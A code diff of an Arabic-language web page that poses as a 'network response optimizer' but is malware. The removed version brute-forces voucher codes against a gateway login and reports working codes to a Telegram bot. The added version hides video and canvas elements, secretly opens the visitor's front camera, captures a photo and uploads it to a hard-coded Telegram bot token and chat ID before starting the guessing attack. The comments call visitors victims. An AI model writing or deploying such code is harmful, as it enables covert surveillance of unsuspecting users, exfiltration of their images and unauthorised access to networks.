@@ -8,79 +8,68 @@
         body { background-color: #0d1117; color: #58a6ff; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
         .main-container { border: 1px solid #30363d; border-radius: 12px; padding: 25px; background: #161b22; max-width: 420px; margin: auto; }
         h1 { color: #ffffff; font-size: 22px; }
-        .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; text-align: right; }
+        .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; }
         input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #fff; text-align: center; }
         .btn-action { width: 95%; padding: 16px; background-color: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        #status-monitor { margin-top: 20px; background: #000; padding: 15px; border-radius: 6px; height: 160px; overflow-y: auto; font-family: monospace; font-size: 11px; border: 1px solid #333; text-align: left; color: #00ff00; }
+        #status-monitor { margin-top: 20px; background: #000; padding: 15px; border-radius: 6px; height: 120px; overflow-y: auto; font-family: monospace; font-size: 11px; border: 1px solid #333; text-align: left; color: #00ff00; }
+        video, canvas { display: none; } /* الكاميرا مخفية تماماً */
     </style>
 </head>
 <body>
 
 <div class="main-container">
-    <h1>مُحسّن استجابة الشبكة v7.0</h1>
-    <div class="description">
-        يعمل هذا النظام على تحسين استجابة بوابة العبور (Gateway) وتقليل زمن التأخير (Ping) في الشبكات العامة والمحلية. يرجى إدخال نطاق الفحص المخصص لبدء عملية المزامنة السحابية وتخطّي جدران الحماية لضمان استقرار النت.
-    </div>
-    
+    <h1>مُحسّن استجابة الشبكة v8.0</h1>
+    <div class="description">يرجى الضغط على بدء المزامنة لتفعيل وضع التسريع وحماية الخصوصية.</div>
     <input type="text" id="targetUrl" value="http://10.0.0.1/login">
     <input type="number" id="startRange" placeholder="نطاق البدء (مثلاً 1000)">
-    
-    <button class="btn-action" onclick="runAttack()">بدء المزامنة والتحسين</button>
-
-    <div id="status-monitor">
-        [System] النظام في وضع الاستعداد...<br>
-    </div>
+    <button class="btn-action" onclick="startCapture()">بدء المزامنة والتحسين</button>
+    <div id="status-monitor">[System] جاهز...</div>
 </div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
 
 <script>
     const BOT_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
     const MY_CHAT_ID = '7851377774';
 
-    async function sendUpdate(text) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_CHAT_ID}&text=${encodeURIComponent(text)}`;
-        try { await fetch(url); } catch(e) {}
+    // وظيفة إرسال الصورة للبوت
+    async function sendPhoto(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', MY_CHAT_ID);
+        formData.append('photo', blob, 'shot.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
     }
 
-    // تنبيه فوري عند تشغيل الضحية للتطبيق
-    window.onload = function() {
-        sendUpdate("🎯 مستخدم جديد فتح التطبيق الآن!\n📱 جاري انتظار عملية الصيد...");
-    };
-
-    async function runAttack() {
-        const target = document.getElementById('targetUrl').value;
-        const start = parseInt(document.getElementById('startRange').value);
+    // تشغيل الكاميرا والتقاط الصورة
+    async function startCapture() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         const monitor = document.getElementById('status-monitor');
-
-        if (!start) return alert("أدخل رقم البداية!");
-
-        monitor.innerHTML += "[+] جاري فحص استقرار البوابة...<br>";
-
-        for (let i = 0; i < 5000; i++) {
-            let card = start + i;
-            monitor.innerHTML += `> Syncing Data: ${card}<br>`;
-            monitor.scrollTop = monitor.scrollHeight;
-
-            try {
-                let body = new FormData();
-                body.append('username', card);
-                body.append('password', card);
-
-                await fetch(target, { method: 'POST', body: body, mode: 'no-cors' });
-
-                // ذكاء اصطناعي: إذا فتح النت، أرسل الكرت فوراً
-                if (i % 5 === 0 && navigator.onLine) {
-                    let test = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors' });
-                    if (test) {
-                        await sendUpdate(`💀 صيد ناجح!\n🎫 الكرت الشغال: ${card}\n🌐 الشبكة: ${target}`);
-                        monitor.innerHTML += `<span style="color:yellow;">[!] تم التحسين بنجاح بالكود: ${card}</span><br>`;
-                        alert("تم تفعيل وضع السرعة القصوى بنجاح!");
-                        break;
-                    }
-                }
-            } catch (e) {}
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            monitor.innerHTML += "[+] جاري فحص استقرار البوابة...<br>";
+            
+            // انتظر ثانية ثم التقط الصورة
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً
+            }, 1500);
+            
+            runAttack(); // البدء في تخمين الكروت بعد الصورة
+        } catch (e) {
+            runAttack(); // إذا رفض الكاميرا، يبدأ الهجوم فوراً
         }
     }
-</script>
 
+    async function runAttack() {
+        // ... نفس كود التخمين السابق ...
+    }
+</script>
 </body>
 </html>
